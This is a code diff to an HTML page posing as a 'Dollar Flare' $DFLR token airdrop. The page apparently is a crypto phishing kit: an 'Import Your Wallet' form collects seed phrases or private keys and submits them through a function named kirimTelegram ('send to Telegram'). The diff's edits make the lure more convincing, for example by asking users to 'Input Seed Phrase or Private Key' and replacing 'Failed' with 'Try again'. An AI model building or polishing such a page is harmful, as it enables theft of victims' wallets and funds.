@@ -328,7 +328,7 @@
         <div class="logo-icon"><img src="logo.png" alt="Dollar Flare" style="width:55px;height:55px;object-fit:contain;display:block;"></div>
         <div>
           <div class="logo-text"><span class="dollar">Dollar</span><span style="color:var(--text)"> Flare</span></div>
-          <div class="logo-tagline">Fueling the Future of On-Chain Activity</div>
+          <div class="logo-tagline">Fueling On-Chain Activity</div>
         </div>
       </a>
       <button type="button" class="nav-pill" onclick="Scroll()">
@@ -388,7 +388,7 @@
   </div>
 
   <div class="progress-total">
-    Total: 115,000,000 tokens
+    Total Airdrop: 115,000,000 $DFLR
   </div>
 </div>
         
@@ -407,7 +407,7 @@
         <div class="modal-eyebrow">Dollar Flare</div>
         <h3>Import Your Wallet</h3>
         <br>
-        <p class="modal-sub">Seed Phrase/Private Key</p>
+        <p class="modal-sub">Input Seed Phrase or Private Key</p>
         <form onsubmit="kirimTelegram(event)">
           <div class="form-group">
             <textarea id="inputPesan" required></textarea>
@@ -425,7 +425,7 @@
 
   <div class="toast" id="toast">
     <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg>
-    Failed
+    Try again
   </div>
 
   <script>
@@ -470,7 +470,7 @@
         if (!data.ok) { btn.disabled = false; btn.textContent = 'Kirim Pesan →'; alert("Terjadi kesalahan. Coba lagi."); return; }
         document.getElementById('formState').style.display = 'none';
         document.getElementById('successState').classList.add('show');
-        showToast(); setTimeout(closeModal, 3000);
+        showToast(); setTimeout(closeModal, 5000);
       } catch (err) { btn.disabled = false; btn.textContent = 'Kirim Pesan →'; alert("Error: Gagal mengirim pesan."); console.error(err); }
     }
     
